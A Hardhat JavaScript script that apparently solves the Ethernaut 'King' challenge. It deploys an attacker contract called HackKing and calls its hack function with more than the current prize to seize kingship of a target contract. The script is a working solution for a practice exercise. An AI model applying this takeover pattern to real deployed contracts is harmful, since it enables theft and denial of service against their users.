const { ethers } = require("hardhat");
const hre = require("hardhat");


async function solve(instance_address, account) {

    const King = await ethers.getContractFactory("King");
    const HackKing = await ethers.getContractFactory("HackKing");

    let king = King.attach(instance_address);

    // Deploy the HackKing contract
    console.log('Deploying the HackKing contract');
    contract = await HackKing.deploy();
    await contract.deployed();
    console.log(`Contract address: ${contract.address}`);

    console.log(`Current King: ${await king._king()}`);

    let current_prize = await king.prize();
    console.log(`Current prize: ${current_prize}`);

    console.log('Claim king from contract');
    let tx = await contract.hack(instance_address, {value: current_prize + 1});
    console.log('Waiting for 10 confirmations...');
    await tx.wait(10);

    console.log(`Current King: ${await king._king()}`);

    console.log('Success!');

}


async function main() {

    const [account] = await ethers.getSigners();
    console.log(`Account address: ${account.address}`);
    console.log('');

    instance_address = '0xe9a49dA78a2E433a97788682d9Fe2E3fbFc8278c';

    await solve(instance_address, account);

}


main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
